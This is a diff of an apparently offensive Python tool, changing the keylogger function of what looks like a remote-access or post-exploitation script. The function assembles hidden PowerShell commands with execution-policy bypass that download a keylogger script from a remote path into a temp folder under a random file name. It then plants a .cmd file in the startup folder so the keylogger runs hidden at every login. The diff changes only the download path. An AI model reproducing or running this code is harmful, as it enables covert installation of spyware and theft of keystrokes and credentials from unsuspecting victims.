@@ -137,7 +137,7 @@ def upload(ipv4,pword,temp_dir):
 
 def keylogger(ipv4,pword,temp_path,startup_path):
     print("[+] Initializing keylogger....")
-    keylogger_command  = f"powershell powershell.exe -noP -ep bypass -windowstyle hidden -c \"iwr -uri {remote_path}/keylogger/keylogger.ps1 -outfile {temp_path}/XukhovfGQPLEcYwZ.ps1\""
+    keylogger_command  = f"powershell powershell.exe -noP -ep bypass -windowstyle hidden -c \"iwr -uri {remote_path}/keylogger.ps1 -outfile {temp_path}/XukhovfGQPLEcYwZ.ps1\""
     controller_command = f"""powershell -noP -ep bypass -w hidden add-content -path \\"{startup_path}/meuqSoQyrCUvhGjpV.cmd\\" -value \\"powershell -noP -ep bypass -w hidden Start-Process powershell.exe -windowstyle hidden "{temp_path}/XukhovfGQPLEcYwZ.ps1"\\" """
     print("[+] keylogger prepared. Ready to download....")
     # print(keylogger_command,'\n\n',controller_command,'\n\n')
